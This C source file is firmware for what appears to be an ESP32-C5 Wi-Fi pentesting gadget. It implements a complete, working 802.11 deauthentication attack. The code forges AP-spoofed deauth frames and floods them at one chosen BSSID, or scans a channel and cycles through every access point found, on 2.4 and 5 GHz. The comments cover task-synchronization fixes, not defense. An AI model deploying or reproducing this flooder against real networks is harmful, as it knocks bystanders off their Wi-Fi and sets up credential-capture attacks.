/*
 * wifi_attacker.c — 802.11 deauth on the ESP32-C5.
 *
 * The C5 talks Wi-Fi 6 on BOTH 2.4 GHz AND 5 GHz, which means it can
 * inject management frames on 5 GHz channels — something the S3 / C6
 * side of POSEIDON physically cannot do. This is the headline C5
 * pentesting feature.
 *
 * Two modes:
 *   - Targeted: deauth one BSSID for `duration_ms`.
 *   - Broadcast: hop nothing, sit on `channel`, blast deauths to
 *     every BSSID seen on that channel during the window.
 *
 * Streams a RESP_STATUS frame periodically so the S3 UI can show
 * "frames sent" without us replying to every burst.
 */
#include "proto.h"
#include "led_fx.h"
#include "esp_wifi.h"
#include "esp_log.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/semphr.h"
#include <string.h>
#include <stdlib.h>

static const char *TAG = "attacker";

struct deauth_arg_t {
    uint8_t  requester[6];
    uint16_t seq;
    uint8_t  bssid[6];
    uint8_t  channel;
    uint8_t  bcast_all;
    uint16_t duration_ms;
    volatile bool stop;
    bool     wait_prev;   /* worker must wait for a predecessor before setup */
};

/* POS-AUDIT-119: single active attack at a time, mirroring pmkid_capture.c /
 * hs_capture.c. Without this, a duplicate ESP-NOW CMD_DEAUTH delivery (the
 * dup-seq case the scan path already guards against) or a second command
 * arriving before the first burst finishes spawns a second task that toggles
 * promiscuous/channel state out from under the first — two tasks fighting
 * over one radio (the per-task predecessor wait keeps their setup ordered;
 * the enumerated AP list is task-local so even a timed-out overlap can't
 * corrupt it). s_ctx also
 * gives CMD_STOP something to signal: the TX loops below poll ctx->stop
 * every frame, so ESC/pause on the Cardputer side actually ends the burst
 * instead of running to the full (up to 60 s) duration regardless. */
static struct deauth_arg_t * volatile s_ctx = NULL;

/* POS-AUDIT-119c: a fixed vTaskDelay() after signalling stop (the first
 * pass of this fix) only protects the CLEANUP tail of the outgoing task —
 * it does nothing about the SETUP at the top of deauth_targeted_task /
 * deauth_bcast_task (esp_wifi_set_promiscuous(true) +
 * esp_wifi_set_channel(r->channel,...)), which both tasks still hit
 * unconditionally before their first stop-check. If the outgoing task is
 * slow to reach that stop-check (ESP-NOW TX inside send_status(), the
 * broadcast task's blocking enumeration scan), its setup call can land
 * AFTER the new task's — silently retargeting the live burst onto the
 * OLD channel for the rest of its run, with the Cardputer dashboard still
 * showing the channel the operator actually picked. A binary semaphore,
 * given exactly once by every task exit path right before vTaskDelete and
 * taken (with a drain of any stale give first, in case CMD_STOP exited a
 * task with no restart following it) before a restart proceeds, makes
 * "wait for the old task to be fully gone" exact instead of a guess. */
static SemaphoreHandle_t s_task_done = NULL;

/* POS-AUDIT-119e: the predecessor-finished wait that USED to run inline in
 * wifi_attacker_deauth() — which executes in the ESP-NOW receive callback (the
 * Wi-Fi task), where blocking for up to 500 ms can stall ESP-NOW RX and trip
 * the task watchdog. Only the non-blocking drain stays in the callback now;
 * this bounded wait runs in the freshly-spawned worker (priority 4), so it
 * blocks a disposable task, not the Wi-Fi task. Radio setup (promiscuous,
 * channel, and the broadcast enumeration scan) happens only after this
 * returns, so a slow predecessor can no longer retarget the live radio. */
static void deauth_wait_for_predecessor(const struct deauth_arg_t *r)
{
    if (!r->wait_prev || !s_task_done) return;
    if (xSemaphoreTake(s_task_done, pdMS_TO_TICKS(500)) != pdTRUE) {
        ESP_LOGW(TAG, "restart: predecessor task didn't exit within 500ms, proceeding anyway");
    }
}

/* POS-AUDIT-018: standard 802.11 deauth template — reason 7 (class-3
 * frame from non-assoc STA). Const template only; each task copies
 * into its own stack-local frame[26] before mutating src/bssid, so
 * back-to-back targeted+broadcast tasks can't trample each other's
 * MAC fields mid-burst. */
static const uint8_t s_frame_tmpl[26] = {
    0xC0, 0x00, 0x00, 0x00,
    0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,           /* dst = broadcast */
    0,0,0,0,0,0,                              /* src = AP */
    0,0,0,0,0,0,                              /* bssid = AP */
    0x00, 0x00,
    0x07, 0x00,                               /* reason code */
};

/* attack_ch is the channel we're currently attacking on (e.g. 157 for
 * 5 GHz). POSEIDON (ESP32-S3) physically cannot tune to 5 GHz channels,
 * so it stays pinned to ch 1. If we send RESP_STATUS while on attack_ch,
 * POSEIDON never hears it. So hop to ch 1 briefly, send, hop back.
 * ~2-5ms per call, negligible against a 250 ms status cadence. */
static void send_status(const uint8_t *requester, uint16_t seq,
                        uint32_t frames_sent, uint8_t attack_ch)
{
    posei_msg_t m;
    proto_init_msg(&m, POSEI_TYPE_RESP_STATUS);
    m.seq = seq;
    memcpy(m.payload, &frames_sent, 4);
    m.payload[4] = attack_ch;
    m.payload_len = 5;

    esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
    proto_send_to(requester, &m);
    /* Tiny wait so the TX actually goes out before we hop back. */
    vTaskDelay(pdMS_TO_TICKS(2));
    esp_wifi_set_channel(attack_ch, WIFI_SECOND_CHAN_NONE);
}

static void deauth_targeted_task(void *arg)
{
    struct deauth_arg_t *r = (struct deauth_arg_t *)arg;
    ESP_LOGI(TAG, "deauth ch=%u bssid=%02x:%02x:%02x:%02x:%02x:%02x dur=%ums",
             r->channel,
             r->bssid[0], r->bssid[1], r->bssid[2],
             r->bssid[3], r->bssid[4], r->bssid[5], r->duration_ms);

    deauth_wait_for_predecessor(r);

    /* Build the spoofed-from-AP, broadcast-to-everyone frame. */
    uint8_t frame[26];
    memcpy(frame, s_frame_tmpl, sizeof(frame));
    memcpy(frame + 10, r->bssid, 6);
    memcpy(frame + 16, r->bssid, 6);

    esp_wifi_set_promiscuous(true);
    esp_wifi_set_channel(r->channel, WIFI_SECOND_CHAN_NONE);

    uint32_t end   = xTaskGetTickCount() + pdMS_TO_TICKS(r->duration_ms);
    uint32_t sent  = 0;
    uint32_t last_status = 0;

    while (!r->stop && xTaskGetTickCount() < end) {
        esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame), false);
        sent++;
        if (xTaskGetTickCount() - last_status > pdMS_TO_TICKS(250)) {
            send_status(r->requester, r->seq, sent, r->channel);
            last_status = xTaskGetTickCount();
        }
        vTaskDelay(pdMS_TO_TICKS(2));
    }
    /* Final status. */
    send_status(r->requester, r->seq, sent, r->channel);

    /* POS-AUDIT-119b: only touch shared radio state if we're still the
     * current attack. c5_deauth_dashboard() on the Cardputer side re-arms
     * every ~56 s (well inside BURST_MS's 60 s window) for the entire
     * duration of a live session — so hitting wifi_attacker_deauth() again
     * while a burst is still finishing its stop-and-exit is the NORMAL
     * steady state here, not a rare edge case. If a newer attack has
     * already taken over (s_ctx now points elsewhere), it already owns
     * promiscuous mode and the channel and will restore them itself when
     * IT exits — doing it here too would race with, and could silently
     * undo, its setup. */
    if (s_ctx == r) {
        esp_wifi_set_promiscuous(false);
        /* Restore ch 1 so subsequent HELLOs / cmd-acks reach POSEIDON. */
        esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
        led_fx_set(LED_MODE_IDLE);
        s_ctx = NULL;
    }
    free(r);
    if (s_task_done) xSemaphoreGive(s_task_done);
    vTaskDelete(NULL);
}

/* Broadcast mode: scan briefly to enumerate APs on `channel`, then
 * rotate through them blasting deauths. */
struct ap_t { uint8_t bssid[6]; };

static void deauth_bcast_task(void *arg)
{
    struct deauth_arg_t *r = (struct deauth_arg_t *)arg;
    ESP_LOGI(TAG, "deauth-all ch=%u dur=%ums", r->channel, r->duration_ms);

    deauth_wait_for_predecessor(r);

    /* POS-AUDIT-119.2: the enumerated AP list is task-local, not a file-global,
     * so if the predecessor-wait above times out and two broadcast tasks
     * briefly overlap, they cannot scribble each other's shared buffer. */
    struct ap_t aps[16];
    int ap_n = 0;

    /* Quick scan locked to the requested channel. */
    wifi_scan_config_t cfg = {
        .ssid = NULL, .bssid = NULL,
        .channel = r->channel,
        .show_hidden = true,
        .scan_type = WIFI_SCAN_TYPE_ACTIVE,
        .scan_time = { .active = { .min = 80, .max = 150 } },
    };
    esp_wifi_scan_start(&cfg, true);
    uint16_t ap_count = 0;
    esp_wifi_scan_get_ap_num(&ap_count);
    if (ap_count > 0) {
        wifi_ap_record_t *recs = malloc(sizeof(wifi_ap_record_t) * ap_count);
        if (recs) {
            esp_wifi_scan_get_ap_records(&ap_count, recs);
            for (int i = 0; i < ap_count && ap_n < 16; ++i) {
                memcpy(aps[ap_n++].bssid, recs[i].bssid, 6);
            }
            free(recs);
        }
    }

    if (ap_n == 0) {
        ESP_LOGW(TAG, "no APs on channel %u", r->channel);
        send_status(r->requester, r->seq, 0, r->channel);
        /* POS-AUDIT-119b: same ownership gate as the main exit path below —
         * see that comment. This early-return never got to
         * esp_wifi_set_promiscuous(true) at all, but it still must not
         * stomp a newer attack's channel if one has already taken over
         * while our enumeration scan was running. */
        if (s_ctx == r) {
            esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
            led_fx_set(LED_MODE_IDLE);
            s_ctx = NULL;
        }
        free(r);
        if (s_task_done) xSemaphoreGive(s_task_done);
        vTaskDelete(NULL);
        return;
    }

    esp_wifi_set_promiscuous(true);
    esp_wifi_set_channel(r->channel, WIFI_SECOND_CHAN_NONE);

    uint8_t frame[26];
    memcpy(frame, s_frame_tmpl, sizeof(frame));

    uint32_t end = xTaskGetTickCount() + pdMS_TO_TICKS(r->duration_ms);
    uint32_t sent = 0;
    uint32_t last_status = 0;
    int cur = 0;

    while (!r->stop && xTaskGetTickCount() < end) {
        const struct ap_t *a = &aps[cur % ap_n];
        memcpy(frame + 10, a->bssid, 6);
        memcpy(frame + 16, a->bssid, 6);
        for (int i = 0; i < 16 && !r->stop && xTaskGetTickCount() < end; ++i) {
            esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame), false);
            sent++;
            vTaskDelay(pdMS_TO_TICKS(3));
        }
        cur++;
        if (xTaskGetTickCount() - last_status > pdMS_TO_TICKS(250)) {
            send_status(r->requester, r->seq, sent, r->channel);
            last_status = xTaskGetTickCount();
        }
    }
    send_status(r->requester, r->seq, sent, r->channel);

    /* POS-AUDIT-119b: see the matching comment in deauth_targeted_task. */
    if (s_ctx == r) {
        esp_wifi_set_promiscuous(false);
        esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
        led_fx_set(LED_MODE_IDLE);
        s_ctx = NULL;
    }
    free(r);
    if (s_task_done) xSemaphoreGive(s_task_done);
    vTaskDelete(NULL);
}

void wifi_attacker_deauth(const uint8_t *requester,
                          const posei_deauth_req_t *req,
                          uint16_t seq)
{
    if (!s_task_done) {
        s_task_done = xSemaphoreCreateBinary();
        if (!s_task_done)
            ESP_LOGE(TAG, "s_task_done create failed (OOM): restart ordering unprotected this session");
    }

    bool wait_prev = false;
    if (s_ctx) {
        /* POS-AUDIT-119/119c/119e: restart race, same shape as
         * pmkid_capture_start / hs_capture_start, but those get a real
         * synchronization point for free (unregistering the promiscuous RX
         * callback blocks until the driver confirms it's gone). There's no
         * equivalent here since this is TX-only, so s_task_done is that point
         * instead. This function runs in the ESP-NOW receive callback (the
         * Wi-Fi task), so it MUST NOT block — the bounded wait for the
         * outgoing task to finish now lives in the new worker
         * (deauth_wait_for_predecessor), not here. All we do here is the
         * non-blocking part: signal stop, and drain any single stale give (a
         * prior task that exited with no successor waiting on it, e.g. a
         * CMD_STOP with no restart following) so the new worker waits on THIS
         * predecessor's give, not a leftover credit. */
        s_ctx->stop = true;
        if (s_task_done) xSemaphoreTake(s_task_done, 0);
        wait_prev = true;
    }

    struct deauth_arg_t *r = malloc(sizeof(*r));
    if (!r) { led_fx_set(LED_MODE_ERROR); return; }
    memcpy(r->requester, requester, 6);
    memcpy(r->bssid, req->bssid, 6);
    r->seq         = seq;
    r->channel     = req->channel;
    r->bcast_all   = req->bcast_all;
    r->duration_ms = req->duration_ms ? req->duration_ms : 5000;
    r->stop        = false;
    r->wait_prev   = wait_prev;
    s_ctx = r;

    /* POS-AUDIT-119d: if the spawn fails (heap exhaustion), nothing will
     * ever free r, give s_task_done, or clear s_ctx — every later call into
     * this function would then see a non-NULL s_ctx, signal stop on a stale
     * pointer, and spawn a worker that burns the full 500 ms predecessor wait
     * for a give that never comes, forever, until reboot. Unwind exactly like
     * the malloc failure right above. */
    BaseType_t spawned = r->bcast_all
        ? xTaskCreate(deauth_bcast_task, "dauth_b", 4096, r, 4, NULL)
        : xTaskCreate(deauth_targeted_task, "dauth_t", 4096, r, 4, NULL);
    if (spawned != pdPASS) {
        ESP_LOGE(TAG, "xTaskCreate failed, deauth not started");
        s_ctx = NULL;
        free(r);
        led_fx_set(LED_MODE_ERROR);
    }
}

void wifi_attacker_deauth_stop(void)
{
    if (s_ctx) s_ctx->stop = true;
}
